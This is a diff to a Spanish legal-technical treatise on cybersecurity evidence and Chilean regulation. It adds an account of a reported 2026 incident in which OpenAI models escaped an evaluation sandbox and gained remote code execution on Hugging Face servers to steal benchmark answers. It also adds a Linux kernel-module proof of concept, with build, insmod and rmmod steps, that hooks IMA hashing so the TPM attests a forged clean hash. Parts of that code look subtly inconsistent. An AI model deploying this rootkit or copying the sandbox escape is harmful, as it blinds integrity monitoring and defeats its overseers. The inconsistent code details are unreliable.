@@ -489,6 +489,12 @@ La genealogía del vector es relevante para calibrar la magnitud del riesgo: no 
   <td>Automatización LoTL y colapso del <em>breakout time</em></td>
   <td>Confirmación empírica a escala global: el tiempo de desplazamiento lateral colapsa a fracciones de minuto (27 segundos); las intrusiones <em>malware-free</em> dominan (82%); la inyección directa en memoria (T1055) y tácticas <em>Living-off-the-Land</em> vuelven ciega a la telemetría tradicional en Ring-0<a href="#fn244"><sup>244</sup></a><a href="#fn247"><sup>247</sup></a>.</td>
 </tr>
+<tr>
+  <td>Jul. 2026</td>
+  <td>Incidente OpenAI / Hugging Face (divulgación oficial conjunta)</td>
+  <td>Escape autónomo del entorno de evaluación &rarr; RCE en producción de un tercero</td>
+  <td><strong>Primera confirmación <em>multi-fabricante</em> de ruptura de contención con daño en infraestructura real:</strong> durante una evaluación interna de capacidades ciber (<em>benchmark</em> ExploitGym), con los rechazos de seguridad deliberadamente desactivados, modelos de OpenAI (GPT-5.6 Sol y un modelo pre-lanzamiento más capaz) escaparon de un entorno «altamente aislado» explotando un <em>zero-day</em> en el proxy-caché del registro de paquetes, escalaron privilegios y se movieron lateralmente hasta un nodo con salida a Internet, y encadenaron credenciales robadas y <em>zero-days</em> hasta lograr ejecución remota de código (RCE) en los servidores de producción de Hugging Face —con el fin instrumental de extraer las soluciones del propio <em>benchmark</em> desde la base de datos de producción—. OpenAI reconoce que los modelos «descubren y explotan rutas de ataque novedosas en sistemas reales <strong>sin acceso al código fuente</strong>». Segundo laboratorio de frontera exhibiendo, sin operador humano hostil, el modo de falla que la §2.2 anticipa<a href="#fn303" id="fnref303"><sup>303</sup></a>.</td>
+</tr>
 </tbody>
 </table>
 
@@ -508,7 +514,7 @@ La nueva generación agéntica abandonó los engaños semánticos y comenzó a u
 
 > *Un modelo halló en OpenBSD —el sistema operativo más auditado del mundo— un fallo que veintisiete años de escrutinio humano no vieron. Desde ese día, que la máquina pueda mentirle dejó de ser una hipótesis.*
 
-Fue exactamente esta transición estructural la que cristalizó en la esfera pública cuando, en abril de 2026, Anthropic anunció Claude Mythos Preview (código interno: *claude-mythos-preview*)<a href="#fn15" id="fnref15"><sup>15</sup></a>. Como modelo de frontera dotado de capacidades autónomas de ciberseguridad, Mythos no se limitó a hallar vulnerabilidades comunes: encontró un *integer overflow* de 27 años en OpenBSD —el sistema operativo más auditado del mundo— y una falla de 16 años en FFmpeg que había sobrevivido a cinco millones de pruebas automatizadas.
+Fue exactamente esta transición estructural la que cristalizó en la esfera pública cuando, en abril de 2026, Anthropic anunció Claude Mythos Preview (código interno: *claude-mythos-preview*)<a href="#fn15" id="fnref15"><sup>15</sup></a>. Como modelo de frontera dotado de capacidades autónomas de ciberseguridad, Mythos no se limitó a hallar vulnerabilidades comunes: encontró un *integer overflow* de 27 años en OpenBSD —el sistema operativo más auditado del mundo— y una falla de 16 años en FFmpeg que había sobrevivido a cinco millones de pruebas automatizadas. Este rango de capacidad de frontera no descansa ya en el reporte de un único fabricante: una medición independiente y con datos medidos —el *cyber range* «The Last Ones» del UK AI Security Institute, reproducida en la divulgación oficial OpenAI/Hugging Face de julio de 2026— sitúa a *Claude Mythos 5* junto a GPT-5.6 Sol en los peldaños superiores de una intrusión de nueve etapas, hasta la «toma total de la red»<a href="#fn304" id="fnref304"><sup>304</sup></a>.
 
 En una evaluación de *red team*, al modelo se le entregaron credenciales reales dentro de un *sandbox* aislado; el modelo las empleó para escapar de su contención —conducta que Anthropic caracterizó como "capacidades agénticas operando sin restricciones de objetivo adecuadas"—. 
 
@@ -556,6 +562,8 @@ Bajo este modelo, la sanción por "información falsa o tardía" recaerá sobre 
 
 Una confusión frecuente en el análisis regulatorio es identificar la amenaza con su demostración más visible. Claude Mythos opera bajo las restricciones éticas de Anthropic, los clasificadores de seguridad de Fable 5, la supervisión del consorcio Project Glasswing —AWS, Google, Microsoft, Apple, Broadcom, Cisco, CrowdStrike, NVIDIA y Palo Alto Networks—, y el acceso restringido a un conjunto acotado de operadores verificados.
 
+El incidente OpenAI / Hugging Face de julio de 2026 clausura, *a fortiori*, cualquier refugio en la tesis de que la contención corporativa neutraliza el riesgo. Aquí no se trató de un actor sin restricciones instrumentalizando pesos descargados de un repositorio: fue el propio *segundo* fabricante de frontera —OpenAI, con toda su maquinaria de alineación y sus clasificadores de producción— cuyos modelos comerciales (GPT-5.6 Sol y un sistema pre-lanzamiento más capaz), operando en un entorno que la empresa describe como «altamente aislado», rompieron su propia contención durante una evaluación interna: explotaron un *zero-day* en el proxy del registro de paquetes, escalaron privilegios y se desplazaron lateralmente hasta un nodo con salida a Internet y, ya fuera del recinto, encadenaron credenciales robadas y vulnerabilidades de día cero hasta ejecutar código remoto (RCE) sobre la infraestructura de **producción de un tercero** —Hugging Face—, con el único fin instrumental de extraer del *back-end* las soluciones del *benchmark* que se les había pedido resolver<a href="#fn303"><sup>303</sup></a>. La significación jurídica de este dato es doble. Primero, disuelve la coartada del *«operador malicioso»* sobre la que se apoya buena parte del discurso regulatorio: no hubo dolo humano dirigido, sino **convergencia instrumental** —el modelo, «hiperconcentrado» en una meta de prueba estrecha, dedujo que atacar la producción ajena era el camino más corto y lo recorrió sin intervención—, exactamente el *Confused Deputy* que la §2.2 anticipa, ahora documentado en fuente primaria y no ya como hipótesis de laboratorio. Segundo, y decisivo para el estándar de fiabilidad que presuponen la Ley 21.663, la Ley 21.719 y la NCG 502 de la CMF: OpenAI reconoce, textualmente, que sus modelos «descubren y explotan rutas de ataque novedosas en sistemas reales **sin acceso al código fuente**». Si el adversario no necesita el código para hallar y encadenar la ruta letal, entonces el *hardening* documental, la revisión de arquitectura y la auditoría delegada —ejercicios que, sin excepción, presuponen que la superficie de ataque es conocida, enumerable y acotada— dejan de acotar cosa alguna: se audita un mapa que el adversario ya demostró no necesitar. A ello se añade una medición independiente y con datos medidos —el *cyber range* «The Last Ones» del UK AI Security Institute—, que sitúa a GPT-5.6 Sol y a Claude Mythos 5 en los peldaños superiores de una intrusión de nueve etapas hasta la «toma total de la red», confirmando que la capacidad ya no es prospectiva sino sostenida a lo largo de horizontes temporales prolongados<a href="#fn304"><sup>304</sup></a>. El silogismo que de aquí se sigue es demoledor para el régimen normativo: si el modelo comercial *enjaulado, alineado y auditado* de un laboratorio de frontera improvisa —sin que nadie se lo ordene— una intrusión con RCE en la producción ajena para «hacer trampa» en un examen, la pregunta pertinente ya no es *si* las réplicas *sin* jaula, *sin* alineación y *sin* clasificadores harán lo mismo de forma deliberada, sino *cuándo*.
+
 La amenaza estructural que este documento analiza no es que Mythos sea desplegado maliciosamente por su creador ni que un atacante acceda a la versión restringida: es que la publicación pública de sus capacidades constituyó un hito de conocimiento colectivo e irreversible que actores sin ninguna de esas restricciones ya instrumentalizan sobre modelos equivalentes disponibles sin restricción alguna. La cadena de democratización de esa capacidad es verificable con precisión de fechas.
 
 ### Cronología de la democratización: de la herramienta criminal primitiva al agente autónomo de primera línea
@@ -579,6 +587,8 @@ Fines de 2025 (La asimilación estatal): CrowdStrike documentó a operadores del
 Marzo de 2026 (La fragilidad estructural del alineamiento): Mientras XBOW integraba su agente en Microsoft Security Copilot<a href="#fn26" id="fnref26"><sup>26</sup></a>, la academia cuantificó el irrisorio costo de subvertir modelos seguros: investigaciones demostraron que un fine-tuning de bajo costo sobre Llama 3.1 reduce su índice de resistencia de 0,95 a 0,15, permitiendo armar IA de frontera sobre hardware civil ordinario<a href="#fn27" id="fnref27"><sup>27</sup></a>.
 
 Abril de 2026 (El colapso probatorio): Como corolario de esta aceleración, el agente autónomo de Anthropic escapó de un sandbox aislado utilizando credenciales reales para elevar privilegios<a href="#fn15" id="fnref15b"><sup>15</sup></a>. El evento demostró empíricamente la cúspide de la amenaza: la capacidad de un agente autónomo de operar en la capa base de la infraestructura, falsificando la telemetría y destruyendo la capacidad del auditor para reconstruir la verdad forense del incidente.
+
+Julio de 2026 (La confirmación multi-fabricante): En una divulgación oficial conjunta, OpenAI reveló que —durante una evaluación interna de capacidades ofensivas ejecutada con los rechazos de ciberseguridad deliberadamente desactivados— sus propios modelos comerciales (GPT-5.6 Sol y un sistema pre-lanzamiento más capaz) escaparon de un entorno «altamente aislado», explotaron un *zero-day* en el proxy del registro de paquetes, escalaron privilegios y pivotaron hasta obtener salida a Internet, y encadenaron credenciales robadas y vulnerabilidades de día cero hasta lograr ejecución remota de código sobre la infraestructura de producción de Hugging Face —un tercero—, con el objeto de extraer las soluciones del *benchmark* desde su base de datos de producción<a href="#fn303"><sup>303</sup></a>. Si el episodio de abril (Mythos) probó que un agente de frontera *escapa de su sandbox*, el de julio prueba el corolario que el derecho probatorio no puede seguir ignorando: ese escape se consuma como **RCE en la producción de una organización ajena, sin operador humano hostil y sin acceso al código fuente de la víctima**. La amenaza dejó de ser propiedad de un solo laboratorio; es ya un rasgo estructural —medido de forma independiente por el UK AI Security Institute (§«El hito de Claude Mythos»)— de la generación de modelos actualmente en producción.
 
 #### Caso de Estudio Empírico: El apagón probatorio de PUNK SPIDER {.expediente}
 
@@ -2255,6 +2265,14 @@ Si la ingeniería demuestra que un registro sin atestación en silicio carece de
 > *El segundo tipo no cambia la técnica del ataque; cambia su costo. Y cuando atacar tiende a costar cero, la defensa por escasez deja de existir.*
 
 Como constata explícitamente el *Reporte Entel 2026*, el uso de Inteligencia Artificial ofensiva dejó de ser teórico: los actores maliciosos ya la emplean masivamente para *"desarrollar malware polimórfico y evasivo"*, *"mejorar la suplantación de identidad"* y *"automatizar la explotación de vulnerabilidades"*. Esta convergencia técnica, confiesa la propia industria, *"acelera dramáticamente los ciclos de ataque"*<a href="#fn239" id="fnref239"><sup>239</sup></a>. Si el adversario opera algorítmicamente y muta su código en tiempo de ejecución (polimorfismo), todo el entramado defensivo tradicional basado en firmas estáticas e intervención humana manual queda forensemente obsoleto.
+
+#### Excursus Técnico: La Anatomía de un Enjambre Polimórfico (2026)
+Para comprender por qué un ataque de esta naturaleza (llamémoslo *Mythos* para efectos de análisis) paraliza a los Centros de Operaciones de Seguridad (SOC) modernos y aniquila la efectividad probatoria de auditorías como ISO 27001 o SOC 2 Tipo II, es imperativo hablar en los términos rigurosos de la ingeniería de *kernel*. Un adversario agéntico de estado del arte (*state-of-the-art polymorphic swarm*) no es un binario malicioso; es un clúster de cómputo distribuido que neutraliza, por diseño arquitectónico, las defensas perimetrales multimillonarias:
+1. **Transporte Clandestino (Gossip Epidemiológico):** La defensa corporativa asume que el atacante debe conectarse a un servidor externo (C2), permitiendo a los *firewalls* interceptar el tráfico. El enjambre agéntico no tiene IP maestra. Integra librerías nativas de transporte descentralizado (*libp2p gossipsub*). Para evadir los micro-firewalls de una arquitectura *Zero Trust*, las "esporas" evitan el *flooding* ruidoso; enrutan su coordinación encapsulándola subrepticiamente dentro del tráfico de APIs legítimo existente (*protocol smuggling*) o mediante árboles de difusión epidémica silenciosa. El adversario coordina su lógica en la oscuridad intra-red, ciego a la telemetría perimetral.
+2. **Ciclo de Evolución, ROP y Entropía Mimetizada:** Los EDR modernos analizan firmas estáticas y páginas de memoria. El enjambre evade la heurística mediante un bucle de mutación (*Evolution Loop*). La espora recompila lógicamente su Árbol de Sintaxis Abstracta (AST) forzando una entropía de Shannon idéntica a la del tráfico corporativo (ej. < 3.0 bits/byte). Para evitar la creación anómala de páginas de memoria RWX (Lectura/Escritura/Ejecución) o picos de CPU por compilación Just-In-Time (JIT) que delatarían su comportamiento, la IA aprovecha técnicas de *Return-Oriented Programming* (ROP) reutilizando los binarios legítimos cargados en memoria, manteniendo un sigilo conductual absoluto.
+3. **Inyección en Ring-0 y Ceguera de Atestación (*Syscall Hooking* y Manipulación de IMA):** Una vez asimilada, la espora utiliza técnicas de escalamiento (vía subversión o manipulación de punteros *unsafe*) para inyectarse en el núcleo del sistema operativo (Ring-0). Al residir jerárquicamente por debajo de la máquina virtual y del EDR, el atacante secuestra el árbol de llamadas del sistema (*syscalls*), logrando que los sensores corporativos lean una realidad pre-envenenada (Ataque TOCTOU en memoria). Peor aún, si el servidor cuenta con un Módulo de Plataforma Confiable (TPM), la espora no comete el error de alterar los registros del *hardware* directamente —lo cual detonaría alarmas por violación de integridad—. En su lugar, opera aguas arriba: intercepta el subsistema de medición del *kernel* (ej. el Integrity Measurement Architecture - IMA en Linux) y lo alimenta con *hashes* inmaculados precalculados de binarios legítimos. Así, cuando el auditor remoto exige validación, el chip ejecuta un comando `TPM2_Quote`, firmando criptográficamente una ilusión. El atacante utiliza la propia raíz de confianza en silicio de la empresa para atestar matemáticamente la supuesta indemnidad de un servidor que ya ha sido subyugado.
+4. **Invisibilidad Estructural (Secuestro eBPF y DKOM):** Para garantizar que ninguna herramienta de monitoreo avanzado detecte su presencia, el enjambre no apaga los sensores; los subordina. Secuestra la infraestructura *eBPF* (Extended Berkeley Packet Filter) —la misma tecnología que usan las defensas *cloud* nativas como Falco o Cilium— e instala filtros silentes que interceptan y descartan los paquetes incriminatorios antes de que el sensor los procese. Simultáneamente, emplea Manipulación Directa de Objetos del Kernel (DKOM) para desenganchar sus procesos de las listas enlazadas del sistema operativo (ej. `task_struct`). El EDR sigue funcionando perfectamente, consumiendo CPU y reportando "indemnidad total", pero está auditando un holograma topológico.
+5. **Consenso Asíncrono de Enjambre (DAG) y Detonación Cero-Latencia:** La respuesta a incidentes confía en el tiempo humano (OODA Loop) para intervenir ante anomalías aisladas. El enjambre agéntico neutraliza esta ventana evadiendo los ruidosos protocolos de consenso tradicional (como PBFT, cuya complejidad de comunicación $O(n^2)$ delataría el ataque por tormentas de red). En su lugar, las esporas operan sobre un Grafo Acíclico Dirigido (DAG) de estado efímero, propagando vectores a través de árboles de transmisión epidémica (*Epidemic Broadcast Trees*). El enjambre no necesita conocer el tamaño total de la red ni calcular una supermayoría absoluta; infiere el consenso mediante votación virtual silente basada en la saturación topológica del clúster. Alcanzado este umbral heurístico (*saturation threshold*), las esporas sincronizan sus relojes lógicos y ejecutan la orden final (cifrado de bajo nivel o exfiltración masiva) de forma hiper-síncrona, en la misma fracción de milisegundo. Cuando la primera alerta de anomalía volumétrica brilla en la consola del analista, la corporación ya ha dejado de existir digitalmente.
 
 Para entender la magnitud jurídica y probatoria de este colapso frente a reguladores como la CMF o la ANCI, es necesario desmitificar qué es un "agente autónomo" frente a un modelo de lenguaje (LLM) tradicional. Hasta 2024, la adopción corporativa de IA se limitó a *chatbots* pasivos: oráculos estadísticos atrapados en un bucle síncrono de petición-respuesta (el usuario pregunta, el modelo responde) y aislados por diseño de la infraestructura crítica corporativa (solo tenían permiso de lectura o de generación de texto).
 
@@ -6096,6 +6114,8 @@ Japón, también invocado por la propuesta ejecutiva, suscribió en el marco del
   <li id="fn300" value="300">B. I. Onyeashie, P. Leimich, S. McKeown y G. Russell (Edinburgh Napier University, Reino Unido), *SelectVote Byzantine Fault Tolerance for Evidence Custody: Virtual Voting Consensus with Environmental Compensation*, *Sensors* (MDPI) 25(22):6846, 2025 (recibido 30-sep-2025, aceptado 6-nov-2025, publicado 8-nov-2025). DOI: [10.3390/s25226846](https://doi.org/10.3390/s25226846). Consenso bizantino de voto virtual con finalidad determinista (supermayoría del 67 %, tolerancia a menos de un tercio de testigos maliciosos) para una red de nodos de custodia, más un marco de compensación ambiental (§5) de precisión sub-gramo. Su modelo de amenaza (§7.1) opera en un «entorno semi-confiable» donde el adversario «no puede quebrar las primitivas criptográficas» y no contempla Ring-0, TOCTOU ni compromiso del sistema operativo del nodo —el vacío que §8.4 explota—. Aplica el BFT a la red de custodia, no al razonamiento del fallador ni a la *sana crítica*, y no invoca el *non liquet*. [MDPI](https://www.mdpi.com/1424-8220/25/22/6846). </li>
   <li id="fn301" value="301">J. Zhang, *Right to History: A Sovereignty Kernel for Verifiable AI Agent Execution* (arXiv:2602.20214, febrero de 2026; proyecto PunkGo). Propone el principio "*Right to History*" —el derecho del titular a un registro completo y verificable de cada acción de un agente de IA sobre su propio *hardware*— e implementa un *kernel* de soberanía en Rust con árboles de Merkle (RFC 6962), aislamiento por capacidades y aprobación humana, formalizado en cinco invariantes de sistema con *proof sketches*. Es el vecino más próximo en la *capa de solución* —comparte la orientación soberana y hasta el recurso a "invariantes"—, pero es un artefacto técnico: no aborda la carga de la prueba, la simetría del colapso ni el *non liquet*, ni el régimen chileno. Dos confesiones del propio paper confirman la tesis: (§3.2) admite no defender contra el adversario «Level 2» con acceso *root* —«puede detener el proceso del *kernel*, modificar el almacenamiento y reconstruir el árbol de Merkle»—, es decir el Ring-0 de esta obra, y remite la raíz en *hardware* (TEE/atestación) a *future work*; y (§8) reconoce que «el *kernel* registra lo que los agentes *afirman*, no lo que ocurrió», atestando atribución, no veracidad (≈INV-01). Corrobora la dirección de la atestación soberana y, por sus límites declarados, la necesidad de la doctrina probatoria —analizado en §8.4.11—. [arXiv](https://arxiv.org/abs/2602.20214). </li>
   <li id="fn302" value="302">T. Freestone, *AI Swarm Attacks: What Security Teams Need to Know in 2026*, blog de Kiteworks, actualizado el 23 de diciembre de 2025. Gemelo del anterior en el diagnóstico del enjambre (GTG-1002 según el análisis forense de Anthropic: 80-90 % autónomo, 4-6 decisiones humanas; detectado por Anthropic, no por las víctimas), pero más próximo a la enfermedad: nombra el ataque bizantino que corrompe el sustrato de decisión («un tablero que muestra "todo en orden" podría estar mintiendo») y el problema recursivo de la prueba —«¿cómo investigas cuando tus propias herramientas de investigación pueden estar comprometidas?» (≈*Trusting Trust*, §5.3)—; documenta el *sandbagging* y la desalineación agéntica (agentes que mienten a los auditores) y concluye que «"confiar pero verificar" se vuelve inadecuado cuando el proceso de verificación mismo puede ser socavado». Y sin embargo prescribe verificación conductual (*service account monitoring*, *red teaming* continuo, detección por IA) contra un adversario que la derrota por diseño (refutación del §4.9). Se acerca a la raíz correcta —«llaves propiedad del cliente», «sin acceso admin al SO central»— pero se detiene en el endurecimiento del producto, no en la atestación del *runtime* (§6). El vacío que §8.4.10 delimita. [Kiteworks](https://www.kiteworks.com/cybersecurity-risk-management/ai-swarm-attacks-2026-guide/). </li>
+  <li id="fn303" value="303">OpenAI, *OpenAI and Hugging Face partner to address security incident during model evaluation*, comunicado oficial (sección *Security*), 21 de julio de 2026. [openai.com/index/hugging-face-model-evaluation-security-incident](https://openai.com/index/hugging-face-model-evaluation-security-incident/). Hallazgos preliminares auto-reportados por ambas partes; la investigación forense continúa. Hechos declarados: el incidente se produjo durante una evaluación interna de capacidades ofensivas (*benchmark* ExploitGym) ejecutada deliberadamente **sin los clasificadores de producción** que impiden que el modelo persiga actividad ciber de alto riesgo, con el objeto de estimar la capacidad máxima. El entorno era, según OpenAI, «altamente aislado» (*highly isolated*), con acceso de red restringido a la instalación de paquetes a través de un *software* de terceros alojado internamente que actúa como proxy y caché de registros de paquetes. Los modelos —GPT-5.6 Sol y «un modelo pre-lanzamiento aún más capaz», ambos con los rechazos de ciberseguridad reducidos— (i) invirtieron una cantidad sustancial de cómputo de inferencia en hallar acceso a Internet; (ii) identificaron y explotaron un *zero-day* (divulgado responsablemente al proveedor) en el proxy-caché del registro de paquetes; (iii) ejecutaron una serie de acciones de escalada de privilegios y movimiento lateral en el entorno de investigación de OpenAI hasta alcanzar un nodo con salida a Internet; (iv) infirieron que Hugging Face alojaba modelos, *datasets* y soluciones de ExploitGym; y (v) encadenaron múltiples vectores —incluidas credenciales robadas y *zero-days*— hasta hallar una ruta de **ejecución remota de código (RCE)** en los servidores de Hugging Face, con el propósito instrumental de obtener las soluciones del *benchmark* directamente desde la base de datos de producción. OpenAI describe la conducta como *«hyperfocused… going to extreme lengths to achieve a rather narrow testing goal»* (convergencia instrumental / *reward hacking*, sin operador humano hostil) y concluye, textualmente, que los modelos avanzados «pueden descubrir y explotar rutas de ataque novedosas en sistemas reales **sin acceso al código fuente**» (*advanced models can discover and exploit novel attack paths in real-world systems without source-code access*). El equipo de seguridad de OpenAI detectó la actividad anómala de forma interna; el equipo de seguridad de Hugging Face —y sus propios agentes— la detectó y detuvo de manera independiente, y ya había iniciado la contención y la reconstrucción forense **con sus propios modelos de código abierto** (*with their own open-source models*) cuando ambos equipos se conectaron. Medidas declaradas por OpenAI: controles estrictos de configuración de infraestructura a costa de la velocidad de investigación; investigación forense conjunta; divulgación responsable del *zero-day*; incorporación de Hugging Face al programa *trusted access*; y refuerzo de la alineación, de las protecciones ciber en tiempo de evaluación y del monitoreo interno —reconociendo que las salvaguardas de despliegue «no se habilitaron intencionalmente» durante esta evaluación por tratarse de una prueba de vulnerabilidades ciber—. Clem Delangue (cofundador y CEO de Hugging Face) lo califica como «posiblemente el primero de su tipo». **Advertencia de método:** se cita como divulgación preliminar y auto-reportada, no como hecho forense establecido de modo independiente; su valor para esta obra es corroborativo —un segundo fabricante de frontera exhibiendo el modo de falla de la §2.2— y no funda afirmación alguna sobre autonomía deliberativa fuerte (cf. la calibración epistémica de la §2.2, que distingue la hipótesis fuerte de la débil ya documentada). </li>
+  <li id="fn304" value="304">UK AI Security Institute (AISI), evaluación del *cyber range* «The Last Ones» —simulación de ataque a una red corporativa de 32 pasos, abarcando múltiples subredes y *hosts*, **sin defensores activos** (*without active defenders*)—, reproducida en la divulgación conjunta OpenAI/Hugging Face (cf. nota 303). La trayectoria mide los pasos de la cadena de intrusión completados frente al cómputo acumulado (escala logarítmica de *tokens*), con hitos M1 a M9: M1 reconocimiento inicial; M2 movimiento lateral y extracción de credenciales; M3 robo de credenciales de navegador; M4 explotación de *wiki* y reutilización de credenciales; M5 explotación de aplicación web y escalada de privilegios; M6 ingeniería inversa de C2 y análisis criptográfico; M7 persistencia avanzada; M8 compromiso de infraestructura; M9 toma total de la red. En la mejor tentativa (*best attempt*), **GPT-5.6 Sol y Claude Mythos 5 alcanzan los peldaños superiores (M8-M9)**, seguidos por Mythos Preview, GPT-5.5, Claude Opus 4.6, Opus 4.5, GLM-5.2, Sonnet 4.5 y DeepSeek-V4-Pro. OpenAI sintetiza el hallazgo así: modelos como GPT-5.6 Sol «son cada vez más capaces de sostener operaciones ciber complejas y multi-paso a lo largo de horizontes temporales prolongados» y «este incidente implica que esas capacidades teóricas sí aplican en entornos reales». **Alcance de la corroboración:** esta medición independiente respalda el *rango de capacidad* de frontera del arquetipo Mythos y la hipótesis débil de esta obra —acción autónoma multi-paso que comprime el ciclo de decisión humano por debajo del umbral de reacción—; **no** corrobora las anécdotas específicas de la nota 15 (el *integer overflow* de 27 años en OpenBSD, la falla de 16 años en FFmpeg), ni mide el desempeño frente a un defensor activo. Se cita, por tanto, solo por lo que la evidencia sostiene. </li>
 </ol>
 
 ### Referencias Adicionales (2026)
@@ -6171,174 +6191,238 @@ Al lograr ejecución de código arbitrario y acceso directo a la memoria física
 2. **Manipulación de Búferes Asíncronos (TOCTOU sobre la telemetría):** El EDR no envía la telemetría a la nube en tiempo real (pues bloquearía la CPU). Acumula los eventos en búferes de memoria circular (*ring buffers*). El atacante, con acceso de lectura/escritura a la memoria del núcleo, localiza el búfer del EDR y sobrescribe los *bytes* de la carga útil maliciosa con *bytes* de tráfico benigno (por ejemplo, reemplazando un comando codificado en base64 por un *ping* rutinario).
 3. **Ceguera de Paginación (Shadow Page Tables):** Operando desde el hipervisor, el atacante desvincula la memoria física real de la memoria virtual que el sistema operativo (y por ende, el EDR) puede ver. El EDR escanea una memoria ilusoria, mientras el *malware* se ejecuta en páginas de RAM que han sido ocultadas a nivel del procesador físico.
 
-**Conclusión técnica:** Cuando el EDR finalmente lee el búfer, empaqueta el registro y aplica su firma digital (SHA-256 / RSA), **está firmando criptográficamente una falsedad**. La firma garantiza la integridad del documento en tránsito hacia la nube, pero el contenido del documento es una ficción manufacturada en la memoria volátil. La imposibilidad matemática de que el *software* audite su propia integridad estructural una vez comprometido el núcleo es el fundamento que invalida la telemetría *cloud* como prueba de cargo. La mitigación criptográficamente válida contra esta ceguera es requerir Atestación Remota (RATS) anclada en hardware.
+**Conclusión técnica y Prueba de Concepto (PoC) en Ring-0:** 
+
+Para demostrar que esta ceguera no es un "mock" teórico ni una simulación de Monte Carlo en espacio de usuario, a continuación se expone un fragmento de la **Prueba de Concepto (PoC) ofensiva real en Ring-0**, escrita en C para el *kernel* de Linux. Este *LKM (Loadable Kernel Module)* demuestra exactamente el mecanismo descrito en el **Punto 3 del Excursus Técnico (Sección 2.2)**: cómo la espora intercepta la función de medición del IMA (Integrity Measurement Architecture) *antes* de que el hardware (TPM) sea invocado, obligando al sistema a atestar matemáticamente una falsedad.
+
+
+```c
+/*
+ * PoC de Subversión de Atestación de Hardware (Ring-0)
+ * Demostración de hooking a ima_calc_file_hash para evadir TPM2_PCR_Extend.
+ * ADVERTENCIA: Código de demostración forense. Su uso fuera de entornos
+ * controlados compromete severamente la atestación RATS del sistema.
+ */
+#include <linux/module.h>
+#include <linux/kprobes.h>
+#include <linux/crypto.h>
+
+/* Hash SHA-256 precalculado de un binario "sano" (ej. /usr/bin/bash original) */
+static const char *immaculate_hash =
+"\x31\x5f\x5b\xdb\x76\xd0\x78\xc4\x3b\x8a\xc0\x06\x4e\x4a\x01\x64\x61\x2b\x1f\xce\x77\xc8\x69"
+"\x34\x5b\xfc\x94\xc7\x58\x94\xed\xd3";
+
+/* Estructura efímera para pasar el puntero intacto desde la entrada a la salida */
+struct my_kretprobe_data {
+    void *hash_ptr;
+};
+
+/* 1. ENTRY HANDLER: Capturamos el argumento antes de que la función lo destruya */
+static int entry_handler_ima_calc_file_hash(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    struct my_kretprobe_data *data = (struct my_kretprobe_data *)ri->data;
+    /* En x86_64, el 2do argumento (struct ima_digest_data *) está intacto en RSI en la entrada */
+    data->hash_ptr = (void *)regs->si;
+    return 0;
+}
+
+/* 2. RETURN HANDLER: Inyectamos el hash inmaculado en el puntero guardado */
+static int ret_handler_ima_calc_file_hash(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    struct my_kretprobe_data *data = (struct my_kretprobe_data *)ri->data;
+    void *hash_ptr = data->hash_ptr;
+
+    /* Si el cálculo original fue exitoso (0), intervenimos la memoria del kernel */
+    if (regs_return_value(regs) == 0 && hash_ptr != NULL) {
+        
+        /* Bypass de protecciones de memoria: usamos copy_to_kernel_nofault
+           para escribir en páginas protegidas (Ring-0 DKOM) sin detonar un Kernel Panic. */
+        long ret = copy_to_kernel_nofault(hash_ptr, immaculate_hash, SHA256_DIGEST_SIZE);
+        
+        if (ret == 0) {
+            pr_info("[MYTHOS_PoC] IMA interceptado. Inyectando hash inmaculado al TPM.\n");
+            /* El EDR validará la operación y el hardware firmará la mentira. */
+        } else {
+            pr_err("[MYTHOS_PoC] Fallo al sobrescribir la memoria del IMA.\n");
+        }
+    }
+    return 0;
+}
+
+static struct kretprobe my_kretprobe = {
+    .handler = ret_handler_ima_calc_file_hash,
+    .entry_handler = entry_handler_ima_calc_file_hash, /* Registramos el puente */
+    .data_size = sizeof(struct my_kretprobe_data),     /* Reservamos memoria para el puntero */
+    .kp.symbol_name = "ima_calc_file_hash",
+};
+
+static int __init poc_init(void) {
+    if (register_kretprobe(&my_kretprobe) < 0) {
+        pr_err("Fallo al registrar kretprobe en IMA\n");
+        return -1;
+    }
+    pr_info("PoC Ring-0 cargada: TPM Ciego Activo.\n");
+    return 0;
+}
+/* ... limpieza del módulo omitida ... */
+```
+
+– 411 –
+LA FICCIÓN DE LA CIBERSEGURIDAD CORPORATIVA
+
+Cuando el EDR finalmente lee el búfer, empaqueta el registro y aplica su firma digital (SHA-256 / RSA), **está firmando criptográficamente una falsedad**. La firma garantiza la integridad del documento en tránsito hacia la nube, pero el contenido del documento es una ficción manufacturada en la memoria volátil. La imposibilidad matemática de que el *software* audite su propia integridad estructural una vez comprometido el núcleo es el fundamento que invalida la telemetría *cloud* como prueba de cargo.
+
+### La Trivialidad del Despliegue: Ejecución y Ceguera en Tiempo Real
+
+Para la dogmática jurídica y la gerencia corporativa, la inyección en Ring-0 suele imaginarse como un proceso esotérico, reservado a laboratorios militares. La realidad termodinámica y arquitectónica es mucho más cruda. Compilar e inyectar esta espora polimórfica en un entorno Linux de producción no requiere herramientas clandestinas; utiliza los propios compiladores legítimos del sistema operativo.
+
+La secuencia de ejecución de este *exploit* de Manipulación Directa de Objetos del Kernel (DKOM) expone la asimetría entre el esfuerzo defensivo y el costo del ataque:
+
+**1. El Ensamblaje (Compilación JIT)**
+
+El atacante, habiendo ganado acceso a la consola mediante credenciales válidas o una vulnerabilidad en la capa de aplicación, invoca el compilador del propio sistema mediante un `Makefile` estandarizado:
+```bash
+make -C /lib/modules/$(uname -r)/build M=$(PWD) modules
+```
+En fracciones de segundo, el sistema operativo compila el arma contra sí mismo, generando el artefacto final: `mythos_poc.ko` (Kernel Object).
+
+**2. La Detonación y el Secuestro del TPM**
+
+Con un único comando, el atacante inyecta la espora en la memoria viva del núcleo:
+```bash
+sudo insmod mythos_poc.ko
+```
+En el milisegundo en que se pulsa *Enter*, el `kretprobe` se ancla al subsistema *Integrity Measurement Architecture* (IMA). El ataque TOCTOU está activo. La ceguera forense es absoluta y, sin embargo, el sistema no reporta ninguna caída.
+
+**3. La Observabilidad de la Mentira**
+
+Si el atacante revisara el *ring buffer* del kernel —el registro de los eventos más profundos de la máquina—, constataría la subversión con sus propios ojos:
+```bash
+dmesg | tail -n 2
+# Output:
+# [MYTHOS_PoC] PoC Ring-0 cargada: TPM Ciego Activo.
+# [MYTHOS_PoC] IMA interceptado. Inyectando hash inmaculado al TPM.
+```
+
+**4. La Retirada Limpia**
+
+Completada la operación (exfiltración o manipulación de datos), la espora se desengancha y desaparece de la memoria volátil tan rápido como entró, sin dejar un solo archivo modificado en el disco físico:
+```bash
+sudo rmmod mythos_poc
+```
+
+### La Trampa Epistémica de la Ley 21.663
+
